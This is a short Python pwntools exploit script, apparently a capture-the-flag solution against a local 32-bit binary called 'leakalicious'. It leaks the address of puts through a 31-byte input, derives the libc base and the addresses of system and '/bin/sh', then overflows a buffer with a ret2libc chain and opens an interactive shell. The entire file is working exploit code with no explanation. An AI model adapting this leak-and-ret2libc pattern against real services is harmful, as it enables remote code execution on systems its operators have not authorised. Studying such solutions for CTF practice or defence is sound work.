from pwn import *

e = ELF('./leakalicious')
#libc = ELF('./libc6_2.23-0ubuntu11_i386.so')
libc = ELF('/lib32/libc.so.6')
p = process('./leakalicious')

print p.recvuntil('?\n> ')
payload = 'A'*31
p.sendline(payload)
p.recvline()
ret = u32(p.recvline().rstrip('?\n'))
libc_base_addr = ret - libc.symbols['puts']
system_addr = libc_base_addr + libc.symbols['system']
binsh_addr = libc_base_addr + next(libc.search("/bin/sh"))

print p.recvuntil('?\n> ')
p.sendline('')
print p.recvuntil('?\n> ')
payload = 'A'*0x2c
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(binsh_addr)
p.sendline(payload)
p.interactive()